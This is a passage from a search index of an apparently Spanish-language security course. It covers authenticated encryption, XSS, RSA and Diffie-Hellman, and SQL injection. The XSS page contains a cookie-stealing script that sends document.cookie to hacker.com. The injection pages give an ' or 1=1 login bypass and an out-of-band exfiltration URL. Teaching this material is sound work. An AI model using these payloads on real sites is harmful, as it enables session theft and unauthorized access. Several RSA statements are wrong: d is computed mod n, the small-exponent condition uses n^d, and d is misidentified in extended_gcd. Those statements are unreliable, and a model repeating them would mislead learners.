id=\"enfoques-de-autentificación\"\u003eEnfoques de autentificación\u003c/h4\u003e\n\u003cp\u003eLa autentificación del mensaje se podría realizar en tres puntos distintos. A continuación se muestran diagramas sobre cada forma de autentificar:\u003c/p\u003e\n\u003ch5 id=\"encrypt-then-mac-etm\"\u003e\u003cstrong\u003eEncrypt-Then-MAC (EtM)\u003c/strong\u003e\u003c/h5\u003e\n\u003cp\u003e\u003cimg src=\"../etm.png\" alt=\"Encrypt Then MAC\"\u003e\u003c/p\u003e\n\u003cp\u003eCorresponde a autentificar el mensaje ya cifrado. Es necesario usar una llave distintas para evitar ataques como \u003ca href=\"https://en.wikipedia.org/wiki/CBC-MAC#Using_the_same_key_for_encryption_and_authentication\"\u003eel que se menciona acá\u003c/a\u003e\u003c/p\u003e\n\u003ch5 id=\"encrypt-and-mac-em\"\u003e\u003cstrong\u003eEncrypt-And-MAC (E\u0026amp;M)\u003c/strong\u003e\u003c/h5\u003e\n\u003cp\u003e\u003cimg src=\"../eam.png\" alt=\"Encrypt And MAC\"\u003e\u003c/p\u003e\n\u003cp\u003eEn este caso no hay problemas con usar la misma llave para ambos procesos.\u003c/p\u003e\n\u003ch5 id=\"mac-then-encrypt-mte\"\u003e\u003cstrong\u003eMAC-Then-Encrypt (MtE)\u003c/strong\u003e\u003c/h5\u003e\n\u003cp\u003e\u003cimg src=\"../mte.png\" alt=\"MAC then encrypt\"\u003e\u003c/p\u003e\n\u003cp\u003eEn este caso tampoco hay problemas con usar la misma llave para ambos procesos.\u003c/p\u003e\n\u003cp\u003eMás información sobre cada enfoque se puede encontrar en \u003ca href=\"https://en.wikipedia.org/wiki/Authenticated_encryption#cite_note-14\"\u003eWikipedia\u003c/a\u003e.\u003c/p\u003e\n\u003ch3 id=\"cifrar-y-autentificar-a-la-vez\"\u003eCifrar y autentificar a la vez\u003c/h3\u003e\n\u003cp\u003eExisten ciertos algoritmos para cifrar datos que integran una rutina de autentificación en el proceso de cifrado. Mencionaremos brevemente dos de los más utilizados:\u003c/p\u003e\n\u003ch3 id=\"aes-gcm-bloque\"\u003eAES-GCM (Bloque)\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003eGalois-Counter Mode\u003c/strong\u003e es un modo de cifrado de bloque que además autentifica el mensaje cifrado. Este modo permite autentificar datos anexos a $P$ que necesiten ser autentificados, pero no cifrados. A esta información adicional no cifrada se le suele denominar $A$.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../gcm.png\" alt=\"Galois-Counter Mode\"\u003e\u003c/p\u003e\n\u003cp\u003eMás información sobre el algoritmo de autentificación \u003ca href=\"https://en.wikipedia.org/wiki/Galois/Counter_Mode\"\u003een Wikipedia\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"chacha20-poly1305-flujo\"\u003eChaCha20-Poly1305 (Flujo)\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003eChaCha20-Poly1305\u003c/strong\u003e corresponde al uso combinado del cifrador de flujo ChaCha20 y del MAC Poly1305. Su funcionamiento es explicado en el \u003ca href=\"https://tools.ietf.org/html/rfc8439\"\u003eRFC 8439\u003c/a\u003e. Google seleccionó este algoritmo como reemplazo de RC4 en TLS/SSL. Este algoritmo suele preferirse sobre AES-GCM en hardware que no tiene procesadores optimizados para AES.\u003c/p\u003e\n"},{id:13,href:"/docs/apps-web/xss/",title:"Cross-Site Scripting",description:"TODO",content:"\u003ch2 id=\"descripción-general\"\u003eDescripción General\u003c/h2\u003e\n\u003cp\u003eEl Cross-Site Scripting, o XSS (punto 7 en el OWASP Top 10), se refiere a una clase de vulnerabilidades que\nintentan introducir código JavaScript en un sitio web, el cual será ejecutado en el navegador de otros usuarios.\nDependiendo de la aplicación en específico, las repercusiones de esto varían desde meras molestias hasta\nla completa ruptura de confidencialidad e integridad del sistema.\u003c/p\u003e\n\u003cp\u003eExisten 3 tipos:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eAlmacenado\u003c/strong\u003e: El payload queda almacenado en algún lado y no es necesario estar activamente atacando a la víctima.\nUna vez que ella acceda a este, se ejecutará el código malicioso.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eReflejado\u003c/strong\u003e: El payload no se almacena permanentemente, sino que viene codificado en alguna variable\n(como un parámetro GET).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eDOM\u003c/strong\u003e: Este tipo de XSS no puede ser ejecutado por medio de variables ni datos almacenados, sino que se debe\nrealizar una serie de acciones específicas en el mismo navegador de la víctima.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"ejemplos\"\u003eEjemplos\u003c/h2\u003e\n\u003cp\u003eUno de los usos más peligrosos de este tipo de ataques es el robo de sesiones. El código introducido toma la\ncookie de sesión de la víctima y se la envía al atacante. Luego él puede simplemente copiar esta cookie en\nsu navegador, con lo cual obtiene acceso autenticado como la víctima. El código a continuación logra hacer esto:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003evar xhr = new XMLHttpRequest();\nxhr.open(\u0026quot;POST\u0026quot;, \u0026quot;https://hacker.com/\u0026quot;, true);\nxhr.setRequestHeader(\u0026quot;Content-Type\u0026quot;, \u0026quot;application/x-www-form-urlencoded\u0026quot;);\nxhr.send(\u0026quot;cookie=\u0026quot; + document.cookie);\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eOtro uso es el Cross-Site Request Forgery (CSRF). Estos ataques intentan impersonar a la víctima, enviando\nconsultas en su nombre. Esto funciona ya que las consultas hechas a través de JavaScript también llevan las cookies\ny parámetros de sesión del usuario, por lo que el atacante tiene el potencial de ganar los mismos permisos que\nla víctima. Esto se podría utilizar, por ejemplo, para realizar acciones en nombre del administrador, con lo cual\ncrear otro usuario con permisos de administrador.\u003c/p\u003e\n"},{id:14,href:"/docs/cripto-moderna/cripto-asimetrica/",title:"Criptografía Asimétrica",description:"TODO",content:"\u003cp\u003e\u003cimg src=\"../public_key_crypto.png\" alt=\"Criptografía de llave pública\"\u003e\u003c/p\u003e\n\u003cp\u003eLa \u003cstrong\u003ecriptografía asimétrica\u003c/strong\u003e o \u003cstrong\u003ecriptografía de llave pública\u003c/strong\u003e se diferencia de la criptografía simétrica en que se usan llaves distintas para cifrar y descifrar mensajes, lo que hace posible publicar la llave de cifrado  con el objetivo de que otras personas puedan enviarnos mensajes que solo nosotros podremos descifrar, usando la llave de descifrado. Algo similar ocurre con la criptografía asimétrica usada para firmas digitales. Se usa una llave para \u0026ldquo;demostrar\u0026rdquo; que un mensaje fue enviado por nosotros mientras se publica la otra para que cualquiera pueda comprobar que la firma es válida.\u003c/p\u003e\n\u003cp\u003eEn general, estos sistemas usan propiedades aritméticas para crear problemas matemáticos que son muy difíciles de resolver con información limitada, pero que conociendo un parámetro secreto puedes resolver de forma fácil.\u003c/p\u003e\n\u003ch2 id=\"rsa\"\u003eRSA\u003c/h2\u003e\n\u003ch3 id=\"cifrado\"\u003eCifrado\u003c/h3\u003e\n\u003cp\u003eFue el primer esquema de cifrado de llave pública. Se destaca por el uso de aritmética modular, definiendo los siguientes parámetros:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e$n$ es un número formado por la multiplicación de dos números primos $p$ y $q$.\u003c/li\u003e\n\u003cli\u003e$x$ es nuestro \u003cstrong\u003emensaje en texto plano\u003c/strong\u003e, codificado como un número perteneciente a $Z_n^*$. Debido a lo anterior, el tamaño de nuestro mensaje se encuentra limitado por la magnitud de $n$.\u003c/li\u003e\n\u003cli\u003e$Z_n^*$ es un grupo multiplicativo de enteros módulo $n$.\u003c/li\u003e\n\u003cli\u003e$e$ es nuestro \u003cstrong\u003eexponente público\u003c/strong\u003e y corresponde a un número menor que $(p-1)(q-1)$.\u003c/li\u003e\n\u003cli\u003e$d$ es el inverso multiplicativo de e en el grupo $Z_n^*$, o sea, $d = 1/e (mod_n)$.\u003c/li\u003e\n\u003cli\u003e$y$ es nuestro \u003cstrong\u003emensaje cifrado\u003c/strong\u003e y se calcula como $x^e (mod_n)$.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eLa \u003cstrong\u003eLlave pública\u003c/strong\u003e en RSA es el par de elementos $(n, e)$, mientras que la \u003cstrong\u003ellave privada\u003c/strong\u003e es el valor $d$.\u003c/p\u003e\n\u003cp\u003eLa gracia de saber que $n=pq$ es que esto nos permite calcular $d$ de forma eficiente, usando el \u003ca href=\"https://en.wikipedia.org/wiki/Extended_Euclidean_algorithm\"\u003ealgoritmo euclidiano extendido\u003c/a\u003e:\u003c/p\u003e\n\u003cp\u003e$extended_gcd(a,b) = ax + by$\u003c/p\u003e\n\u003cp\u003eEn el algoritmo anterior, el valor de $d$ es igual al valor de $a$ al ejecutar $extended_gcd(e, (p-1)(q-1))$.\u003c/p\u003e\n\u003cp\u003eLes recomendamos leer el capítulo 10 del libro \u003cem\u003eSerious Cryptography\u003c/em\u003e para entender por qué ocurre esto.\u003c/p\u003e\n\u003ch4 id=\"cifrado-y-descifrado-en-rsa\"\u003eCifrado y descifrado en RSA\u003c/h4\u003e\n\u003cp\u003ePara cifrar un mensaje en RSA, basta con calcular $y = x^e$, mientras que para descifrar el mensaje, basta con calcular $y^d$, ya que como $d$ es el inverso de $e$, $y^d = x^{e^d} = x^{ed} = x$.\u003c/p\u003e\n\u003cp\u003eEn varias implementaciones, se suele fijar el valor de $e$ a un número pequeño, como por ejemplo $2^16+1$ *(65537), aunque también podría usarse $3$ o $17$ si se usa el padding adecuado (ver sección siguiente para más detalles).\u003c/p\u003e\n\u003ch4 id=\"problemas-de-seguridad-en-rsa\"\u003eProblemas de seguridad en RSA\u003c/h4\u003e\n\u003cp\u003eUna mala implementación de RSA puede generar problemas de seguridad que permitirían incluso descifrar un mensaje. A continuación mencionamos algunos de ellos:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e$n$ muy pequeño\u003c/strong\u003e: En general, se suele usar un $n$ de tamaño 2048 bits o más para que el nivel de seguridad del valor cifrado sea similar a un cifrado con llave simétrica de 112 bits. En la práctica, un $n$ de tamaño 300 bits o menos, éste es fácilmente factorizable en un computador de uso personal.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e$e$ muy pequeño y mensajes sin padding\u003c/strong\u003e: Si $e$ es un valor muy pequeño, $x \u0026lt; n^d$ y el mensaje cifrado $y$ no tiene \u003ccode\u003epadding\u003c/code\u003e, es posible calcular la raíz $e$ésima de $y$ para calcular $x$.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMala generación de números primos\u003c/strong\u003e: Es muy importante que los números primos $p$ y $q$ se generen de forma aleatoria. En caso que esto no sea así, se corre el riesgo de encontrarlos, y con esto poder derivar el valor secreto $d$.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProblemas de maleabilidad en valores cifrados\u003c/strong\u003e: Supongamos que ciframos con la misma llave pública dos valores pequeños $x_1$ y $x_2$, obteniéndose $y_1$ e $y_2$ respectivamente. Si $y_1y_2 \u0026lt; n$, una persona externa podría calcular el valor cifrado de $x_1x_2$ simplemente multiplicando los valores cifrados de $x_1$ y $x_2$. Para evitar este problema, se suele aplicar un \u003ccode\u003epadding\u003c/code\u003e especial a todos los valores cifrados con RSA, de forma que su representación numérica corresponda a un número grande.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eComputación Cuántica\u003c/strong\u003e El problema de factorización en el cual se basa la seguridad de RSA es resolvible en tiempo polinomial con computadores cuánticos usando el \u003ca href=\"https://en.wikipedia.org/wiki/Shor%27s_algorithm\"\u003ealgoritmo de Shor\u003c/a\u003e. Afortunadamente, todavía no se conoce públicamente la existencia de un computador cuántico con la capacidad de factorizar números del tamaño de los usados en RSA.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eLa \u003ca href=\"https://en.wikipedia.org/wiki/RSA_(cryptosystem)\"\u003epágina en Wikipedia\u003c/a\u003e menciona con mayor detalle los ataques posibles a RSA, sin embargo, la comprensión de algunos de estos problemas requieren recordar hartos contenidos de teoría de números.\u003c/p\u003e\n\u003ch4 id=\"padding-en-cifrado-rsa-oaep\"\u003ePadding en cifrado RSA: OAEP\u003c/h4\u003e\n\u003cp\u003e\u003cimg src=\"../oaep.jpg\" alt=\"OAEP\"\u003e\u003c/p\u003e\n\u003cp\u003eEl diagrama anterior, obtenido del libro \u003cstrong\u003eSerious Cryptography\u003c/strong\u003e, muestra en términos generales el uso de padding en RSA. Uno de los algoritmos de padding más usados en RSA es OAEP, el cual funciona de la siguiente forma:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../oaep_2.jpg\" alt=\"OAEP\"\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSe genera $M = H || 000 \u0026hellip; 001 || K$ ($||$ significa concatenar), donde $H$ es una constante conocida, seguida de tantos bytes $00$ como sea necesario para que el tamaño de $M$ en bytes sea el mismo que el de $n$, seguido de un byte $01$. Finalmente, se coloca el mensaje original $K$.\u003c/li\u003e\n\u003cli\u003eLa función $Hash1$ recibe de entrada un valor de largo igual al de $H$ y devuelve un valor de largo igual al de $M$. Llamaremos a este valor $A$\u003c/li\u003e\n\u003cli\u003eLa función $Hash2$ recibe de entrada un valor de largo igual al de $M$ y devuelve un valor de largo igual al de $H$. Llamaremos a este valor $B$\u003c/li\u003e\n\u003cli\u003eEl valor paddeado $P$ se construye de la siguiente forma: $P = 00 || B || A$. Este es el valor que se cifra con RSA finalmente.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eEl proceso de descifrado requerirá seguir los pasos anteriores en orden inverso, con el objetivo de obtener el verdadero texto plano.\u003c/p\u003e\n\u003ch3 id=\"firmas\"\u003eFirmas\u003c/h3\u003e\n\u003cp\u003eEn el caso de RSA, para un documento M, se define su firma $S = M^d mod_n$, donde M es el mensaje a firmar. Para verificar la firma, es necesario calcular $S^e mod_n$ y comparar este valor con el documento recibido.\u003c/p\u003e\n\u003cp\u003eHay que tener en consideración que, al igual que en el caso de cifrado RSA, el tamaño del mensaje a cifrar está limitado por el tamaño de $n$.\u003c/p\u003e\n\u003ch4 id=\"potenciales-ataques-a-las-firmas-rsa\"\u003ePotenciales ataques a las firmas RSA\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eFirma de mensajes \u0026ldquo;triviales\u0026rdquo;\u003c/strong\u003e: Si no se usa una función de padding, y existe la posibilidad de querer firmar un mensaje como $0$, $1$ o $n-1$. En todos estos casos, $x^d$ es igual a $x$, por lo que no es necesario conocer $d$ para generar la firma del mensaje.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eBlinding Attack\u003c/strong\u003e: Si no se usa una función de padding y se quiere obtener la firma de un mensaje $M$ sin que la persona que firma el mensaje se entere que lo firmó, se le puede pasar un mensaje $R^eM$ para firmarlo. La firma de este mensaje corresponderá a $(R^eM)^d = R^{ed}M^d = RM^d$. Este valor se puede dividir por R de forma de obtener $M^d$, que es la firma del mensaje M.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"padding-en-firmas-rsa\"\u003ePadding en firmas RSA\u003c/h4\u003e\n\u003cp\u003eA continuación se mencionan dos algoritmos de padding que suelen usarse en RSA:\u003c/p\u003e\n\u003ch5 id=\"pss\"\u003ePSS\u003c/h5\u003e\n\u003cp\u003eLamentablemente, no hay demostración de que OAEP es un método de padding seguro para firmas RSA. Sin embargo, existe otro algoritmo de padding para este caso, denominado PSS.\u003c/p\u003e\n\u003cp\u003eLa implementación de PSS es algo compleja, por lo que la enlazaremos solamente: \u003ca href=\"https://web.archive.org/web/20170810025803/http://grouper.ieee.org/groups/1363/P1363a/contributions/pss-submission.pdf\"\u003ereferencia\u003c/a\u003e.\u003c/p\u003e\n\u003ch5 id=\"fdh\"\u003eFDH\u003c/h5\u003e\n\u003cp\u003eFull Domain Hash es una forma más simple de paddear un documento, ya que considera simplemente calcular su hash con alguna función de hashing segura y luego firmar ese valor. Formalmente, no está demostrada su seguridad, pero en la práctica se considera una buena función de padding, debido a que su simplicidad disminuye considerablemente la posibilidad de error en implementación que sí posee PSS.\u003c/p\u003e\n\u003ch2 id=\"acuerdo-de-llaves-diffie-hellman\"\u003eAcuerdo de llaves Diffie-Hellman\u003c/h2\u003e\n\u003cp\u003eEn general se considera que Withfeld Diffie y Martin Hellman son los creadores del concepto de criptografía de llave pública. Ellos crearon también un esquema para acordar una llave compartida entre dos partes, denominado generalmente como \u003ccode\u003eprotocolo Diffie-Hellman\u003c/code\u003e. Este protocolo requiere de los siguientes valores:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eUn número primo grande $p$ de forma de definir un grupo multiplicativo $Z_p^*$ sobre el cual trabajar.\u003c/li\u003e\n\u003cli\u003eUn número generador $g$, perteneciente a $Z_p^*$. En general se suele usar $g = 2$.\u003c/li\u003e\n\u003cli\u003eCada parte que desea comunicarse debe elegir un número aleatorio en $Z_p^*$. Los denominaremos $a$ y $b$ para $Alicia$ y $Bob$ respectivamente.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eEn este caso, se consideran como llave pública los valores $g^a$ y $g^b$, y como llave privada los valores $a$ y $b$.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../dh.jpg\" alt=\"Diffie Hellman según Serious Cryptography\"\u003e\u003c/p\u003e\n\u003cp\u003ePara obtener el valor compartido que usarán como llave simétrica para comunicarse, primero Alicia envía a Bob el número $g^a$ y Bob envía a Alicia el número $g^b$. Si existiese una persona entre medio observando el intercambio, no tendría como deducir $a$ o $b$ a partir de $g^a$ o $g^b$ (al problema de obtener $x$ a partir de un $g^x$ $mod_{p}$ se le conoce como de \u003ca href=\"https://en.wikipedia.org/wiki/Discrete_logarithm\"\u003eel problema del logaritmo discreto\u003c/a\u003e y se considera que no existe un método general de resolución para él).\u003c/p\u003e\n\u003cp\u003eFinalmente, para calcular el secreto compartido, cada parte eleva el valor recibido por su número aleatorio secreto. De esta forma, Alicia obtendrá $g^a^b = g^{ab}$, mientras que Bob obtendrá $g^b^a = g^{ba} = g^{ab}$. Ahora, ambas partes pueden usar ese valor compartido para cifrar mensajes.\u003c/p\u003e\n\u003ch3 id=\"problemas-de-seguridad-dh\"\u003eProblemas de seguridad DH\u003c/h3\u003e\n\u003cp\u003e\u003cimg src=\"../dh_mitm.jpg\" alt=\"MITM en Diffie Hellman según Serious Cryptography\"\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eMan-In-The-Middle Attack (Ataque de Entidad al medio de la comunicación)\u003c/strong\u003e: DH provee un mecanismo para negociar un valor secreto entre dos partes, pero no tiene en cuenta la necesidad de autentificar que la persona con la que hablas es quien dice ser. Nada evita que una tercera entidad que controle el canal de comunicación (Eva) pueda hacerse pasar por Bob frente a Alice, y por Alice frente a bob, generando dos números aleatorios $c$ y $d$ y sus respectivas llaves públicas $g^c$ y $g^d$. Eva recibiría tanto $g^a$ como $g^b$ y los guardaría, mientras envía $g^c$ y $g^d$ a Alicia y Bob respectivamente. El secreto compartido entre Alicia y Eva será $g^{ac}$ mientras que el secreto compartido entre Bob y Eva será $g^{bd}$. Cada vez que Alicia o Bob envíen un mensaje a Eva, ella podrá descifrarlo usando el secreto del emisor, y luego recifrarlo con el secreto del receptor. Para evitar este problema, se podría firmar la llave pública enviada a la contraparte utilizando algún otro metodo de criptografía de llave pública negociado con anterioridad.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eReplay Attacks (Ataques de Repetición)\u003c/strong\u003e: Incluso si se pudiera autenticar el mensaje, no hay forma de demostrar si el mensaje que viene de Alicia fue emitido ahora o fue emitido hace tiempo, pero ahora Eva lo está reenviando. Una forma de evitar este problema es agregando interactividad al protocolo de generación del secreto compartido, por ejemplo, pidiendo recibir un \u0026ldquo;valor de confirmación\u0026rdquo; que utilice tanto la llave pública de Alicia como la de Bob en ese momento para su generación.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eUso directo de $g^{ab}$ como secreto compartido\u003c/strong\u003e: Sabemos por lo visto que $g^ab$ es un número aleatorio del grupo $Z_p^*$. Sin embargo, esto no significa que sea un número aleatorio (en el sentido que la probabilidad de cada bit de ser 0 o 1 sea la misma), dado que el grupo que forma el generador $g$ podría tener algún sesgo en la codificación de los números generados. Para evitar esta posibilidad, se suele hashear el valor $g^{ab}$ con alguna función resistente a colisiones, como SHA3 o alguna KDF.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"criptografía-de-curvas-elípticas\"\u003eCriptografía de Curvas Elípticas\u003c/h2\u003e\n\u003cp\u003eLa criptografía de curvas elípticas (ECC) utiliza la estructura algebráica de curvas elípticas sobre cuerpos finitos que puee ser usada tanto para negociación de llaves como para firmas digitales, y tiene la ventaja de que las llaves y firmas producidas en ella suelen ser mucho más pequeñas que las de Diffie-Hellman o RSA, manteniendo el nivel de seguridad. En este curso no trataremos con ellas, pero en caso de querer saber más, recomendamos leer el capítulo 12 del libro \u003cstrong\u003eSerious Cryptography\u003c/strong\u003e.\u003c/p\u003e\n"},{id:15,href:"/docs/apps-web/inyecciones/",title:"Inyecciones",description:"TODO",content:"\u003ch2 id=\"descripción-general\"\u003eDescripción General\u003c/h2\u003e\n\u003cp\u003eEn términos generales, una inyección (punto 1 del OWASP Top 10) es un ataque que intenta confundir al servidor\nde forma que interprete datos como si fueran código. Esto tiene un potencial muy grande de explotación, aunque\nusualmente está restringido por factores como filtros, configuraciones de seguridad y tecnologías usadas.\u003c/p\u003e\n\u003cp\u003eEstos ataques suelen conllevar a filtración de información, pero también puede ser posible crear,\nmodificar y eliminar datos, ejecutar comandos de sistema, enviar requests a otros servidores, y realizar\nuna denegación de servicio (DoS) por la utilización de demasiados recursos. En general ocurren porque el\nservidor no sanitiza correctamente datos controlados por el usuario, para luego utilizarlos directamente en un\nsistema separado con el cual debe interactuar por medio de una API o algo similar.\u003c/p\u003e\n\u003ch2 id=\"sql\"\u003eSQL\u003c/h2\u003e\n\u003cp\u003eLas inyecciones SQL (o SQLi) son el ataque más conocido en general. Como lo dice el nombre, este se refiere a la\ninyección de comandos SQL en una consulta. Si no conocen SQL, o necesitan refrescar su memoria, los invito a\nver el \u003ca href=\"https://www.w3schools.com/sql/default.asp\"\u003etutorial de w3schools\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003eUn ejemplo de esta inyección sería un formulario de login que toma los parámetros entregados por el\nusuario y los usa directamente en la consulta:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eSELECT username FROM users WHERE username = '$username' AND password = SHA256('$password');\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eLuego esto puede ser aprovechado para ingresar de manera autenticada, sin tener credenciales. La forma de hacerlo\nes ingresando el usuario \u003ccode\u003e' or 1=1; -- - \u003c/code\u003e. Reemplazando esto en la consulta anterior, nos queda:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eSELECT username FROM users WHERE username = '' or 1=1; -- - ' AND password = SHA256('$password');\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eEsto selecciona a los usuarios que cumplan con \u003ccode\u003eusername = ''\u003c/code\u003e o que \u003ccode\u003e1=1\u003c/code\u003e. El resto del comando está comentado\npor \u003ccode\u003e-- -\u003c/code\u003e. Ya que todos los usuarios cumplen con esta condición, el atacante se autentica ingresa de manera\nautenticada como el primer usuario que aparezca en la respuesta.\u003c/p\u003e\n\u003cp\u003eLas inyecciones se dividen en 2 tipos:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eNon Blind\u003c/strong\u003e: En donde las respuestas a las consultas se retornan directamente al atacante, y por lo tanto puede\nrobarse toda la información muy rápidamente.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eBlind\u003c/strong\u003e: Las respuestas a las consultas no se muestran en ninguna parte, por lo que se debe utilizar otras técnicas\npara obtener la información. Esto usualmente significa consultar caracter por caracter (el nombre de usuario\nempieza con a?), y distinguir las respuestas en base al comportamiento del servidor.\nEstos nuevamente se dividen en 2:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eBoolean Based\u003c/strong\u003e: El servidor realiza una acción dependiendo de si la consulta fue exitosa o no. Por ejemplo,\nlanzar un error, autenticar a un usuario, ejecutar un proceso, etc.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eTime Based\u003c/strong\u003e: Esta técnica se basa en el tiempo de respuesta del servidor. La forma de utilizarla es hacer una\nconsulta que intencionalmente haga esperar al servidor en ciertos casos. Por ejemplo, si el nombre de usuario\nempieza con a, espera 5 segundos y retorna, sino retorna inmediatamente.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eLa herramienta \u003ca href=\"https://github.com/sqlmapproject/sqlmap\"\u003esqlmap\u003c/a\u003e se utiliza mucho para hacer un análisis\nautomatizado de este tipo de inyecciones. Envía un conjunto de requests estándar, el cual se adapta a la\ninformación recolectada y otros parámetros, con lo cual puede detectar la gran mayoría de las inyecciones\nsimples.\u003c/p\u003e\n\u003ch2 id=\"otros-tipos\"\u003eOtros Tipos\u003c/h2\u003e\n\u003cp\u003eExisten muchos otros tipos de inyecciones que no veremos en este curso, pero es bueno que sepan que existen.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eNoSQL: Similar a las SQLi, pero en sistemas NoSQL. Esto tiene diferencias de sintaxis y añade comandos y\nfunciones no disponibles en SQL.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eXML: El Extensible Markup Language (XML) se utiliza en muchos lados y es notorio por sus riesgos de seguridad,\nya que tiene hartas funcionalidades explotables. Algunas categorías de inyección XML son:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eTag Injection\u003c/li\u003e\n\u003cli\u003eXML eXternal Entities (XXE)\u003c/li\u003e\n\u003cli\u003eXML Entity Expansion (XEE)\u003c/li\u003e\n\u003cli\u003eXPath\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eLightweight Directory Access Protocol (LDAP): Este es una especie de motor de búsqueda dentro de directorios\ny archivos, y de vez en cuando se utiliza para procesar consultas web.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"técnicas-avanzadas\"\u003eTécnicas Avanzadas\u003c/h2\u003e\n\u003cp\u003eExisten técnicas avanzadas de inyección que se escapan del ámbito del curso. Si se interesan, a continuación\npueden encontrar un pequeño resumen.\u003c/p\u003e\n\u003ch3 id=\"out-of-bounds-oob\"\u003eOut Of Bounds (OOB)\u003c/h3\u003e\n\u003cp\u003eMuchas veces el sistema que está siendo analizado es efectivamente vulnerable a inyecciones, pero no es posible\nobtener los resultados, ni siquiera con métodos ciegos. En estos casos se puede intentar una inyección fuera\nde banda o \u003cem\u003eOut Of Bounds\u003c/em\u003e (OOB). El objetivo es obtener los resultados a la consulta por medio de un canal\ndiferente al cual se realizó la inyección.\u003c/p\u003e\n\u003cp\u003ePor ejemplo, supongamos que además de la inyección, es posible\nenviar un request a otro servidor. Luego, la información podría ser filtrada al enviarla a una URL controlada\npor el atacante, como \u003ccode\u003ehttps://hacker.com?data=\u0026lt;data\u0026gt;\u003c/code\u003e. Esta técnica se puede combinar con inyecciones de tipo\nBlind y Non Blind.\u003c/p\u003e\n\u003ch3 id=\"second-order\"\u003eSecond Order\u003c/h3\u003e\n\u003cp\u003eDe vez en cuando sucede que una inyección no se ejecuta al momento de enviar el payload, sino que este queda\nalmacenado. Luego al acceder a este más adelante, se logra la inyección. Se llaman inyecciones de segundo\norden porque se explotan por medio de 2 requests:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eSe envía el payload, el cual queda almacenado.\u003c/li\u003e\n\u003cli\u003eSe intenta acceder a los datos almacenados, en donde se realiza la inyección.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003ePara ilustrar esto, imaginemos un sitio en donde nos registramos con el usuario \u003ccode\u003euser' or '1'='1\u003c/code\u003e. Luego,\ningresamos al portal y vemos nuestro perfil, en donde el servidor realiza la consulta:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eSELECT data FROM users WHERE username = '$username';\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eReemplazando la variable por nuestro usuario obtenemos:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eSELECT data FROM users WHERE username = 'user' or '1'='1';\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eEs decir, estamos seleccionando el campo \u003ccode\u003edata\u003c/code\u003e de todos los usuarios en la base de datos. Esta técnica\ntambién puede ser combinada con inyecciones de tipo Blind y Non Blind.\u003c/p\u003e\n"},{id:16,href:"/docs/cripto-moderna/ejercicios/",title:"Ejercicios Cripto Moderna",description:"TODO",content:"\u003ch2 id=\"hashing\"\u003eHashing\u003c/h2\u003e\n\u003ch2 id=\"criptografía-simétrica\"\u003eCriptografía Simétrica\u003c/h2\u003e\n\u003ch3 id=\"encoding-better\"\u003eEnCoding Better\u003c/h3\u003e\n\u003cp\u003eInterceptamos las comunicaciones del \u003cstrong\u003eFrente Hacker Antorcha\u003c/strong\u003e y obtuvimos este mensaje cifrado. Además, nuestro espía infiltrado logró conseguir el fuente del programa que usan para cifrar sus mensajes. Necesitamos que nos ayudes a recuperar el mensaje en texto 